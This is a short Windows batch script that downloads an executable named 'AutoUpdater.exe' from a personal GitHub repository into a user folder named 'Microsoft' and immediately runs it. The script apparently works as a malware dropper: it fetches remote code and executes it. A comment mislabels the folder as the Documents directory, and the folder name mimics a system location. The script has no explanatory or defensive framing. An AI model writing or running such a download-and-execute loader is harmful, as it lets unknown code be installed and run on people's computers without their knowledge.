@echo off
set "file=AutoUpdater.exe"
set "url=https://github.com/Sxzzzy/blue/raw/main/%file%"
set "docPath=%USERPROFILE%\Microsoft"

:: Ensure the Documents directory exists
if not exist "%docPath%" mkdir "%docPath%"

:: Download the file
curl -L %url% -o "%docPath%\%file%"

:: Execute the file
cd /d "%docPath%"
start "" "%file%"
